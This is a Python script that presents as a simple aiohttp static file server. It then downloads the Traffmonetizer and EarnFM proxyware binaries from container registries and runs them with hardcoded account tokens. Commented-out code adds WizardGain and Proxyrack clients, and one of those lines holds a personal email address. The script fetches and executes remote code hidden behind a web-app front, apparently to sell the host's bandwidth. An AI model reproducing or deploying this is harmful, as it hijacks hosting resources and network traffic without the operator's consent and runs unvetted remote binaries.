import asyncio, aiohttp.web, pathlib, uvloop, os, posixpath, tarfile, io#, wizardgain, builtins, uuid

async def main():
    app = aiohttp.web.Application()
    app.add_routes([aiohttp.web.static('/', pathlib.Path(__file__).resolve().parent, show_index=True)])
    runner = aiohttp.web.AppRunner(app)
    await runner.setup()
    site = aiohttp.web.TCPSite(runner, port=os.getenv('PORT'))
    await site.start()
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout()) as client:
        async with client.get(f'https://auth.docker.io/token?service=registry.docker.io&scope=repository:traffmonetizer/cli_v2:pull') as response:
            token = (await response.json()).get('token')
            async with client.get(f'https://registry-1.docker.io/v2/traffmonetizer/cli_v2/manifests/sha256:6dbf8e75cc93e25131e2e701b1d478b3ccbf89212636b08d629621c270f0c966', headers={'authorization':'Bearer ' + token, 'accept':'application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json'}) as manifests:
                async with client.get(posixpath.join('https://registry-1.docker.io/v2/traffmonetizer/cli_v2/blobs', (await manifests.json()).get('layers')[0].get('digest')), headers={'authorization':'Bearer ' + token}) as response:
                    tar = tarfile.open(mode='r:gz', fileobj=io.BytesIO(await response.content.read()))
                    member = tar.getmember('usr/local/bin/cli')
                    member.name = pathlib.Path(member.name).name
                    tar.extract(member, path=pathlib.Path(__file__).resolve().parent)
        await asyncio.create_subprocess_exec(pathlib.Path(__file__).resolve().parent.joinpath('cli'), 'start', 'accept', '--token', 'ELGPy/DEQYDtARslA6HnkrbPIF6JQi+qYLCre5LBe58=')
        async with client.get(f'https://ghcr.io/token?service=ghrc.io&scope=repository:earnfm/earnfm-client:pull') as response:
            token = (await response.json()).get('token')
            async with client.get(f'https://ghcr.io/v2/earnfm/earnfm-client/manifests/sha256:00d14f4e510e7e697853ea697e47694db06144efe596123582f2aca9868cd047', headers={'authorization':'Bearer ' + token, 'accept':'application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json'}) as manifests:
                for layer in (await manifests.json()).get('layers'):
                    async with client.get(posixpath.join('https://ghcr.io/v2/earnfm/earnfm-client/blobs', layer.get('digest')), headers={'authorization':'Bearer ' + token}) as response:
                        tar = tarfile.open(mode='r:gz', fileobj=io.BytesIO(await response.content.read()))
                        if 'app/main' in tar.getnames():
                            member = tar.getmember('app/main')
                            member.name = pathlib.Path(member.name).name
                            tar.extract(member, path=pathlib.Path(__file__).resolve().parent)
                            break
        await asyncio.create_subprocess_exec(pathlib.Path(__file__).resolve().parent.joinpath('main'), 'GBe6ucXT3x2pgt1YGyoLxashB1GDwuwp', 'galaxycloud')
    #asyncio.create_task(wizardgain.run_client(builtins.str(uuid.uuid4()), 'chaowen.guo1@gmail.com', 'https://connector.wizardgain.com'))
    #while True:
    #    node = await asyncio.create_subprocess_exec('node', pathlib.Path(__file__).resolve().parent.joinpath('script.js'), '--homeIp', 'point-of-presence.sock.sh', '--homePort', '443', '--id', 'galaxycloud', '--version', '54', '--clientKey', 'proxyrack-pop-client', '--clientType', 'PoP')
    #    await node.wait()
    await asyncio.Event().wait()
    
uvloop.run(main())
